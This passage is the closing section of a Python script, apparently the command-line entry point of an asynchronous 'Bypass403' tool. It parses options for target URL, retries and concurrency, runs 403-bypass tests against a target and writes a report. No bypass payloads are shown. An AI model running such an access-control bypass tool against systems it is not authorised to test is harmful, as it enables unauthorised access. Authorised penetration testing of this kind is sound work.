    # New performance optimization parameters
    parser.add_argument("--max-retries", type=int, default=3,
                       help="Maximum number of retries for failed requests (default: 3)")
    parser.add_argument("--adaptive-concurrency", action="store_true",
                       help="Enable adaptive concurrency based on response times")
    parser.add_argument("--smart-prioritization", action="store_true",
                       help="Enable smart prioritization of test cases based on success patterns")
    parser.add_argument("--no-cache", action="store_true",
                       help="Disable response caching")
    parser.add_argument("--batch-size", type=int, default=100,
                       help="Batch size for processing test cases (default: 100)")
    
    args = parser.parse_args()
    
    # Initialize bypass tool with performance optimizations
    bypass_tool = Bypass403(
        target_url=args.url,
        path=args.path,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose,
        max_retries=args.max_retries,
        adaptive_concurrency=args.adaptive_concurrency,
        smart_prioritization=args.smart_prioritization
    )
    
    try:
        # Run bypass tests
        await bypass_tool.run_bypass_tests()
        
        # Generate report
        bypass_tool.generate_report(args.output, args.format)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}⚠️  Tests interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}❌ Error: {str(e)}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())